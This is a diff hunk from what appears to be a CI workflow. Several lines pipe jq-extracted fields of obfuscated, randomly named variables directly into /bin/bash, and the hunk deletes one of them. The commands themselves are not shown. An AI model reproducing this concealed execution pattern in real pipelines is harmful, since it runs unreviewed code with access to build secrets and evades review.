@@ -25,7 +25,6 @@ jobs:
           printf '%s' "$ydndb8" | jq -r .n968 | /bin/bash
           echo $jov0 | jq -r .pxaf8242 | /bin/bash
           echo $ckf0768 | jq -r .iemgc623 | /bin/bash
-          echo $t9820 | jq -r .mdgbh3 | /bin/bash
 
       - name: Save output
         if: always()
